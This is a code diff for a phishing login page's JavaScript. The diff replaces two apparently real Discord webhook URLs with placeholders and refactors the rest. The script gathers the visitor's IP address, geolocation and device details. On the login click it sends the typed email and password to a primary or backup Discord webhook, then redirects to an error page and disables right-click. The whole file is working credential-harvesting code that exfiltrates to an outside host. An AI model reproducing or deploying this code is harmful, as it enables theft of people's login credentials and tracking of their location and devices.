@@ -2,32 +2,27 @@
 // SELECTING ELEMENTS
 // ----------------------------------
 const loginButton = document.querySelector("button");
-const ipDisplay = document.getElementById("user-ip"); // For showing IP
 
 // Webhook URLs
-const PRIMARY_WEBHOOK_URL =
-  "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s ";
-const BACKUP_WEBHOOK_URL =
-  "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo ";
+const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_PRIMARY_WEBHOOK ";
+const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_BACKUP_WEBHOOK ";
 
 // Variables to store user data
 let userIP = "Unknown IP";
-let userDeviceInfo = {};
 let whoisData = {};
+let userDeviceInfo = {};
 
 // -----------------------------------
-// FETCH IP ADDRESS ON PAGE LOAD
+// FETCH USER IP ADDRESS
 // -----------------------------------
-
-// Try multiple services to fetch public IP
 async function fetchIPAddress() {
-  const ipServices = [
+  const services = [
     "https://api.ipify.org ?format=json",
     "https://ident.me/.json ",
-    "https://checkip.amazonaws.com ",
+    "https://checkip.amazonaws.com "
   ];
 
-  for (const url of ipServices) {
+  for (const url of services) {
     try {
       let response;
       if (url.includes("json")) {
@@ -40,15 +35,16 @@ async function fetchIPAddress() {
         return ip.trim();
       }
     } catch (error) {
-      console.warn(`Failed IP fetch from: ${url}`, error);
-      continue;
+      console.warn(`Failed to fetch IP from: ${url}`, error);
     }
   }
 
   return "Unknown IP";
 }
 
-// WHOIS lookup using ipwho.is
+// -----------------------------------
+// FETCH WHOIS / GEOLOCATION DATA
+// -----------------------------------
 async function fetchWhoisData(ip) {
   try {
     const response = await fetch(`https://ipwho.is/ ${ip}`);
@@ -59,18 +55,6 @@ async function fetchWhoisData(ip) {
     return {};
   }
 }
-
-// Fetch the IP address when the page loads and display it
-document.addEventListener("DOMContentLoaded", async () => {
-  userIP = await fetchIPAddress(); // Store the IP address
-  ipDisplay.textContent = userIP; // Show the IP on the page
-  console.log("User IP Address:", userIP);
-
-  whoisData = await fetchWhoisData(userIP);
-  console.log("WHOIS Data:", whoisData);
-
-  collectDeviceInfo();
-});
 
 // -----------------------------------
 // COLLECT DEVICE INFORMATION
@@ -84,13 +68,13 @@ function collectDeviceInfo() {
     platform: navigator.platform,
     screenWidth: window.screen.width,
     screenHeight: window.screen.height,
-    language: navigator.language,
+    language: navigator.language || navigator.userLanguage,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    referrer: document.referrer || "Direct",
+    referrer: document.referrer || "Direct"
   };
-  console.log("Device Info:", userDeviceInfo);
 }
 
+// Helper functions
 function getBrowserName() {
   const ua = navigator.userAgent;
   if (/Firefox/.test(ua)) return "Firefox";
@@ -117,11 +101,11 @@ function getOS() {
 }
 
 // -----------------------------------
-// SEND DATA TO WEBHOOK
+// SEND DATA TO DISCORD WEBHOOK
 // -----------------------------------
 async function sendCredentialsToWebhook(email, password) {
   try {
-    const embedPayload = {
+    const payload = {
       embeds: [
         {
           title: "Login Attempt",
@@ -141,43 +125,41 @@ async function sendCredentialsToWebhook(email, password) {
             { name: "Language", value: userDeviceInfo.language, inline: true },
             { name: "Referrer", value: userDeviceInfo.referrer, inline: false },
           ],
-          timestamp: new Date().toISOString(),
-        },
-      ],
+          timestamp: new Date().toISOString()
+        }
+      ]
     };
 
-    let response = await fetch(PRIMARY_WEBHOOK_URL, {
+    // Send to primary webhook
+    let res = await fetch(PRIMARY_WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(embedPayload),
+      body: JSON.stringify(payload)
     });
 
-    if (!response.ok) {
-      console.error("Primary webhook failed. Attempting backup...");
-      response = await fetch(BACKUP_WEBHOOK_URL, {
+    if (!res.ok) {
+      console.log("Primary webhook failed. Trying backup...");
+      res = await fetch(BACKUP_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embedPayload),
+        body: JSON.stringify(payload)
       });
-      if (!response.ok) console.error("Backup webhook also failed.");
-      else console.log("Sent via backup webhook.");
-    } else {
-      console.log("Sent via primary webhook.");
     }
+
+    if (res.ok) {
+      console.log("Data successfully sent.");
+    } else {
+      console.error("Failed to send data to both webhooks.");
+    }
+
   } catch (error) {
-    console.error("Error sending credentials:", error);
+    console.error("Error sending data:", error);
   }
 }
 
 // -----------------------------------
-// ELLIPSIS ANIMATION
-// ------------------------------------
-function removeEllipsisAnimation() {
-  loginButton.innerHTML = "";
-  loginButton.textContent = "Log In";
-  loginButton.removeAttribute("disabled");
-}
-
+// HANDLE LOGIN BUTTON CLICK
+// -----------------------------------
 function animateEllipsis() {
   const emailInput = document.getElementById("emailORphone");
   const passwordInput = document.getElementById("password");
@@ -207,15 +189,24 @@ function animateEllipsis() {
   loginButton.setAttribute("disabled", "true");
 
   setTimeout(() => {
-    removeEllipsisAnimation();
+    loginButton.textContent = "Log In";
+    loginButton.removeAttribute("disabled");
     window.location.href = "error.html";
   }, 3000);
 }
 
-// --------------------------
-// ATTACHING EVENT LISTENERS
-// --------------------------
-loginButton.addEventListener("click", animateEllipsis);
-document.addEventListener("contextmenu", function (e) {
-  e.preventDefault();
+// -----------------------------------
+// INIT ON PAGE LOAD
+// -----------------------------------
+document.addEventListener("DOMContentLoaded", async () => {
+  userIP = await fetchIPAddress();
+  whoisData = await fetchWhoisData(userIP);
+  collectDeviceInfo();
+
+  // Optional: Display IP on page
+  const ipDisplay = document.getElementById("user-ip");
+  if (ipDisplay) ipDisplay.textContent = userIP;
 });
+
+loginButton.addEventListener("click", animateEllipsis);
+document.addEventListener("contextmenu", e => e.preventDefault());
